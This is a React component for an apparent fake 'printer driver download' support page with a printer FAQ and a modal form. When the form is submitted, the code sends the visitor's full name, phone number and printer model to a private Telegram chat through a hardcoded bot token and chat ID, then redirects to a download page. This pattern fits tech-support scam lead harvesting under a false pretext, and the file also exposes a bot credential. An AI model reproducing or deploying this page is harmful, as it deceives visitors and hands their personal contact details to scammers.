import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import photo from "../images/photo.png";

const PageHere: React.FC = () => {
  const navigate = useNavigate();
  const [showForm, setShowForm] = useState(false);
  const [activeFaq, setActiveFaq] = useState<number | null>(null);
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
    printerModel: "",
  });

  const botToken = "7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk";
  const chatId = "1684000886";

  const faqItems = [
    {
      question: "How do I find my printer model number?",
      answer: "Check the front, top, packaging, or user manual.",
    },
    {
      question: "What's included in the driver package?",
      answer:
        "Printer drivers, scanning utilities, and device management tools.",
    },
    {
      question: "Is this software compatible with my OS?",
      answer: "Supports Windows 10/11, macOS 12+, and Linux.",
    },
    {
      question: "How do I install the printer driver?",
      answer:
        "Download the driver, run the installer, and follow on-screen instructions.",
    },
    {
      question: "Why is my printer not printing?",
      answer:
        "Check connections, ensure paper is loaded, and restart both the printer and computer.",
    },
    {
      question: "How do I update my printer drivers?",
      answer:
        "Visit the manufacturer's website and download the latest driver for your model.",
    },
    {
      question: "Can I install the driver without internet?",
      answer:
        "Yes, but you need to download it first and transfer it via USB or external storage.",
    },
    {
      question: "How do I connect my printer wirelessly?",
      answer:
        "Use the printer’s Wi-Fi setup mode and connect it to your network, then install the drivers.",
    },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: `New Driver Request:\nName: ${formData.name}\nPhone: ${formData.phone}\nPrinter Model: ${formData.printerModel}`,
        }),
      });
      navigate("/download-page");
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 font-sans flex flex-col items-center justify-center px-4">
      <section className="w-full max-w-6xl mb-10">
        <img
          src={photo}
          alt="Printer Support"
          className="w-full object-contain rounded-lg shadow-xl cursor-pointer"
          onClick={() => setShowForm(true)}
        />
      </section>
      <section className="max-w-4xl w-full mb-10">
        <h2 className="text-3xl font-bold text-[#D32F2F] mb-6 text-center">
          Frequently Asked Questions
        </h2>
        <div className="space-y-4">
          {faqItems.map((item, index) => (
            <div key={index} className="border rounded-lg bg-white shadow-sm">
              <button
                className="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-50 rounded-lg"
                onClick={() => setActiveFaq(activeFaq === index ? null : index)}
              >
                <span className="text-lg font-semibold text-gray-800">
                  {item.question}
                </span>
                <span
                  className={`text-[#D32F2F] transform transition-transform ${
                    activeFaq === index ? "rotate-180" : ""
                  }`}
                >
                  ▼
                </span>
              </button>
              {activeFaq === index && (
                <div className="px-6 py-4 bg-gray-50 border-t">
                  <p className="text-gray-600 leading-relaxed text-base">
                    {item.answer}
                  </p>
                </div>
              )}
            </div>
          ))}
        </div>
      </section>
      {showForm && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4">
          <div className="bg-white rounded-2xl w-full max-w-md p-6">
            <h2 className="text-2xl font-bold text-[#D32F2F] text-center mb-6">
              Download Printer Drivers
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <input
                type="text"
                placeholder="Full Name"
                required
                className="w-full px-4 py-3 border rounded-lg text-lg"
                value={formData.name}
                onChange={(e) =>
                  setFormData({ ...formData, name: e.target.value })
                }
              />
              <input
                type="tel"
                placeholder="Phone Number"
                required
                className="w-full px-4 py-3 border rounded-lg text-lg"
                value={formData.phone}
                onChange={(e) =>
                  setFormData({ ...formData, phone: e.target.value })
                }
              />
              <input
                type="text"
                placeholder="Printer Model"
                required
                className="w-full px-4 py-3 border rounded-lg text-lg"
                value={formData.printerModel}
                onChange={(e) =>
                  setFormData({ ...formData, printerModel: e.target.value })
                }
              />
              <button
                type="submit"
                className="w-full py-3 bg-[#D32F2F] text-white text-lg font-medium rounded-lg hover:bg-[#B71C1C] transition"
              >
                Download Now
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default PageHere;
